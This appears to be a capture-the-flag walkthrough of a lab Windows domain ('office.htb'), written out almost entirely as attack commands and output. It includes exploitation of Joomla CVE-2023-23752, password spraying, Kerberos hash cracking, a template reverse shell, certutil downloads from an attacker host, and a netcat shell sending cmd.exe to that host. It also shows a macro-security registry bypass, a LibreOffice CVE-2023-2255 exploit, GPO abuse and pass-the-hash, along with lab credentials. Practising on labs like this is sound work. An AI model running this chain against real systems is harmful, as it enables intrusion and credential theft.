@@ -1,0 +1,241 @@
+
+scanning : 
+
+ ffuf -u "http://office.htb/FUZZ"  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -fc 403                                               [12:44AM ] 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://office.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+Images                  [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 245ms]
+Media                   [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 246ms]
+TMP                     [Status: 301, Size: 331, Words: 22, Lines: 10, Duration: 250ms]
+administrator           [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 244ms]
+api                     [Status: 301, Size: 331, Words: 22, Lines: 10, Duration: 254ms]
+cache                   [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 245ms]
+components              [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 248ms]
+images                  [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 247ms]
+includes                [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 256ms]
+index.php               [Status: 200, Size: 24214, Words: 4869, Lines: 448, Duration: 558ms]
+language                [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 243ms]
+layouts                 [Status: 301, Size: 335, Words: 22, Lines: 10, Duration: 242ms]
+media                   [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 245ms]
+modules                 [Status: 301, Size: 335, Words: 22, Lines: 10, Duration: 242ms]
+plugins                 [Status: 301, Size: 335, Words: 22, Lines: 10, Duration: 257ms]
+robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 243ms]
+templates               [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 251ms]
+tmp                     [Status: 301, Size: 331, Words: 22, Lines: 10, Duration: 242ms]
+:: Progress: [4723/4723] :: Job [1/1] :: 199 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
+                                                                                              
+robots.txt : 
+
+# If the Joomla site is installed within a folder
+# eg www.example.com/joomla/ then the robots.txt file
+# MUST be moved to the site root
+# eg www.example.com/robots.txt
+# AND the joomla folder name MUST be prefixed to all of the
+# paths.
+# eg the Disallow rule for the /administrator/ folder MUST
+# be changed to read
+# Disallow: /joomla/administrator/ -> joomla version 4.2.7-> might be contain vulnerable -> research -> CVE-2023-23752
+#
+# For more information about the robots.txt standard, see:
+# https://www.robotstxt.org/orig.html
+
+User-agent: *
+Disallow: /administrator/
+Disallow: /api/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+
+
+exploit -> CVE-2023-23752 ->  Got Password: H0lOgrams4reTakIng0Ver754!
+
+brute force username on AD : kerbrute tool : 
+
+./kerbrute userenum -d office.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  --dc office.htb 
+
+got username : 
+
+2024/02/22 23:19:06 >  [+] VALID USERNAME:       administrator@office.htb
+2024/02/22 23:24:36 >  [+] VALID USERNAME:       Administrator@office.htb
+2024/02/22 23:27:26 >  [+] VALID USERNAME:       etower@office.htb
+2024/02/22 23:27:26 >  [+] VALID USERNAME:       ewhite@office.htb
+2024/02/22 23:27:27 >  [+] VALID USERNAME:       dwolfe@office.htb
+2024/02/22 23:27:28 >  [+] VALID USERNAME:       dmichael@office.htb
+2024/02/22 23:27:28 >  [+] VALID USERNAME:       dlanor@office.htb
+
+with username and password : test
+
+  crackmapexec smb office.htb  -u username.txt  -p 'H0lOgrams4reTakIng0Ver754!' --shares                                                                
+SMB         office.htb      445    DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         office.htb      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         office.htb      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         office.htb      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         office.htb      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         office.htb      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+The NETBIOS connection with the remote host timed out.
+SMB         office.htb      445    DC               [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
+
+
+Host found : 
+smbclient -L  //office.htb -U dwolfe%H0lOgrams4reTakIng0Ver754!                                                                                   [12:07AM 1 ⨯ ] 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SOC Analysis    Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to office.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+Got file .pcap from SOC Anslysis : 
+
+  smbclient '//office.htb/SOC Analysis' -U dwolfe%H0lOgrams4reTakIng0Ver754!                                                                        [12:09AM 1 ⨯ ] 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed May 10 14:52:24 2023
+  ..                                DHS        0  Wed Feb 14 05:18:31 2024
+  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 20:59:00 2023
+
+                6265599 blocks of size 4096. 1110027 blocks available
+smb: \> get Latest-System-Dump-8fbc124d.pcap
+getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (401.2 KiloBytes/sec) (average 401.2 KiloBytes/sec)
+smb: \> 
+
+
+resource might help : https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
+
+cipher : a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
+( username tstark )
+
+crack with hashcat : 
+
+
+ hashcat -m 19900  '$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc' /usr/share/wordlists/rockyou.txt 
+
+PASSWORD : playboy69
+
+Gain access web account: 
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce
+
+login with administrator with password cracked.
+
+move to /administrator: 
+
+upload reverseshell : System -> Template.
+
+setup netcat listen -> exploit : curl -s 'http://office.htb/templates/cassiopeia/error.php'  -> gain access web acount
+
+upload RunasCs.exe -> gain access with tstark : 
+
+certutil.exe -urlcache -f http://10.10.14.24:8000/RunasCs.exe runascs.exe ( command use to download when in cmd shell on powershell can use curl)
+
+.\runascs.exe tstark playboy69 powershell -r 10.10.14.24:9001 -> need setup netcat listen -> got user flag 
+
+
+CVE-2023-2255 
+certutil.exe -urlcache -f http://10.10.14.24:8000/chisel.exe chisel.exe 
+
+forward port 8083 with chisel 
+
+On Kali machine : chisel server --reverse --port 9009   
+
+on server windows : .\chisel.exe client 10.10.14.24:9009 R:kali_port:127.0.0.1:windows_port
+                      
+                    .\chisel.exe client 10.10.14.24:9009 R:8083:127.0.0.1:8083
+
+
+C:\xampp\htdocs\internal\applications -> file remove after few second when upload
+
+create odf malicious : https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html
+
+
+
+turn off off reg key to execute file odf 
+
+reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f
+
+certutil.exe -urlcache -f http://10.10.14.24:8000/shell.odt shell.odt -> upload with web account
+
+
+or https://github.com/elweth-sec/CVE-2023-2255.git
+
+python3 CVE-2023-2255.py --cmd "C:\Users\Public\Downloads\connect.exe" --output 'exploit1.odt'
+
+python3 CVE-2023-2255.py --cmd "C:\Users\Public\Downloads\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.24 9002" --output 'exploit1.odt'
+
+
+curl http://10.10.14.24:8000/nc.exe -o nc.exe
+
+upload the file odt to web ( server : 127.0.0.1:kali_port had forward ) -> setup listen port
+
+dpapi::masterkey /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
+**MASTERKEYS**
+
+
+
+evil-winrm -i office.htb -u hhogan -p 'H4ppyFtW183#'
+
+bloodhound-python -c ALL -u tstark -p 'playboy69' -d office.htb -dc dc.office.htb -ns 10.10.11.3                                                      [ 2:07AM ] 
+INFO: Found AD domain: office.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: dc.office.htb
+WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.office.htb
+WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+INFO: Found 13 users
+INFO: Found 54 groups
+INFO: Found 8 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.office.htb
+INFO: Done in 00M 24S
+
+https://github.com/FSecureLABS/SharpGPOAbuse
+
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Controllers Policy"
+
+gpupdate /force -> admin
+
+exploit after get root : 
+
+evil-winrm  10.10.11.3 -u 'administrator' -p 'aad3b435b51404eeaad3b435b51404ee:f5b4f1e96c7ffca801ed5832e5e9105d' 
